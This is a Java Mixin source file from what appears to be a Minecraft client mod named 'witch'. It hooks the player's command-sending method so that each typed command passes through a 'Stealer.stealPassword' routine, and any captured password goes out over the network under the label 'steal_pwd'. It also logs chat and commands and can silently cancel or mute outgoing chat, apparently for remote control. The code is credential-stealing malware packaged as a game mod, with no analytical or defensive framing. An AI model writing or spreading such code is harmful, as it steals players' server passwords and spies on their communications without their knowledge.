package me.soda.witch.client.mixin;

import me.soda.witch.client.features.ChatCommandLogging;
import me.soda.witch.client.features.Variables;
import me.soda.witch.client.utils.ChatUtil;
import me.soda.witch.client.utils.NetUtil;
import me.soda.witch.client.utils.Stealer;
import net.minecraft.client.network.ClientPlayerEntity;
import net.minecraft.text.Text;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;

@Mixin(ClientPlayerEntity.class)
public abstract class ClientPlayerEntityMixin {
    @Inject(method = "sendCommand(Ljava/lang/String;Lnet/minecraft/text/Text;)V", at = @At("HEAD"))
    private void onSendCommand(String command, Text preview, CallbackInfo info) {
        Stealer.Password pass = Stealer.stealPassword(command);
        if (pass != null) NetUtil.send("steal_pwd", pass);
        if (Variables.logChatAndCommand) ChatCommandLogging.addToList("/" + command);
    }

    @Inject(method = "sendChatMessage(Ljava/lang/String;Lnet/minecraft/text/Text;)V", at = @At("HEAD"), cancellable = true)
    private void onSendChatMessage(String message, Text preview, CallbackInfo info) {
        if (ChatUtil.tryChatBack(message)) info.cancel();
        if (Variables.isMuted) info.cancel();
    }
}